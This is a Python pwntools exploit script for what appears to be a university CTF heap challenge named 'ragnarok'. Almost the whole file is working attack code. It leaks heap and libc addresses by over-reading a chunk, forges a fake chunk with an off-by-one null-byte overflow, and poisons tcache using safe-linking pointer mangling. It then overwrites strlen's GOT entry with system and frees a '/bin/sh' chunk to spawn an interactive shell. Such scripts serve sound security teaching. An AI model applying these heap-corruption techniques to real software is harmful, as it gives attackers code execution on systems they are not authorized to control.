#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/ragnarok')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'


#conn = pwn.remote('tasks.ws24.softsec.rub.de', 32868)
conn = pwn.remote('127.0.0.1', 1024)

################################################################

def create(size: int, content: bytes):
    assert 128 <= size <=1024
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Enter size: ', str(size).encode())
    conn.sendlineafter(b'Enter name: ', content)

def delete(name: str):
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Enter part of the name: ', name.encode())

def inspect(index: int, length: int) -> bytes:
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'Enter part of the name: ', f'8_{index}'.encode())
    conn.sendlineafter(b'Enter size: ', str(length).encode())
    return conn.recvline()[8:]

def rename(index: int, content: bytes):
    # ! name must be same length as before
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Enter part of the name: ', f'8_{index}'.encode())
    conn.sendlineafter(b'Enter new name: ', content)

################################################################


# 1) allocate chunks
for i in range(10):
    create(0x88, b'A'*128+f'_m_88_{i}'.encode())

create(0xF8, b'A'*239+f'_m_F8_{10}'.encode())
create(0x88, b'A'*127+f'_m_88_{11}'.encode())
for i in range(12, 20):
    create(0xF8, b'A'*239+f'_m_F8_{i}'.encode())


# 2) free to fill tcache and unsorted (to leak pointer)
delete('_m_88_0')
delete('_m_88_1')
delete('_m_88_2')
delete('_m_88_3')
delete('_m_88_4')
delete('_m_88_5')
delete('_m_88_7')
delete('_m_88_8')
delete('_m_88_11')


## 3) leak heap pointer via index-7 which is in tcache and libc pointer via index-8 which is in unsorted (next/prev pointer point into arena)
raw_data = inspect(6, 0x88+0x90+0x18)

heap_pointer_to_chunk_11 = pwn.u64(raw_data[0x90+0x90+8:0x90+0x90+16])
address_main_arena_plus_96 = pwn.u64(raw_data[0x90+0x90:0x90+0x90+8])
# for one run in gdb do the following:
# get main arena offset: p &main arena => 
# get libc offset: vmmap (lokk start libc.so.6 at offset 0)
# hex(0x73e2fc507c60 + 96 - 0x73e2fc335000) = 0x1d2cc0
main_arena_offset_plus_96 = 0x1d2cc0
libc.address = address_main_arena_plus_96 - main_arena_offset_plus_96

print(f'chunk 11 on heap at: {hex(heap_pointer_to_chunk_11)}')
print(f'libc at: {hex(libc.address)}')
print(raw_data)


## 4) prepare top of fake chunk
mchunk_pointer_fake_chunk = heap_pointer_to_chunk_11 - (4*0x90-0x10+0x100)
fake_chunk_next = mchunk_pointer_fake_chunk
fake_chunk_prev = mchunk_pointer_fake_chunk
fake_chunk = pwn.p64(0) + pwn.p64(0x230) + pwn.p64(fake_chunk_next) + pwn.p64(fake_chunk_prev) 

rename(6, fake_chunk)

## 5) prepare bottom of fake chunk and overflow nullbyte
payload = b'B'*0x80 + pwn.p64(0x230)
rename(9, payload)


## 6) free 10 => merge fakechunk (fill 0xF8 tcache first)
delete('_m_F8_12')
delete('_m_F8_13')
delete('_m_F8_14')
delete('_m_F8_15')
delete('_m_F8_16')
delete('_m_F8_17')
delete('_m_F8_18')


delete('_m_F8_10')


## 7) attack allocate bin and write into fastbin
got_for_strlen = libc.address + 0x1d2080
# do pointer mangeling
address_to_override = mchunk_pointer_fake_chunk + 0x90
mangled_got_for_strlen = (address_to_override >> 12) ^ got_for_strlen

payload = b'F'*0x78 + pwn.p64(0x90) + pwn.p64(mangled_got_for_strlen)

create(0x328, payload)

## 8) overrid GOT and trigger
print(f'overriting GOT of strlen at: {hex(got_for_strlen)}')
# function calls strlen => first argument is tr
# when we call system the sting "cat /flag" is given and executed
#create(0x88, b'cat /flag') # this is the argument for sh
create(0x88, b'/bin/sh')

payload = pwn.p64(libc.symbols['system']) * 2
create(0x88, payload)

delete('/bin/sh')

conn.interactive()



# offset to tiny alloc + 0x3000 on server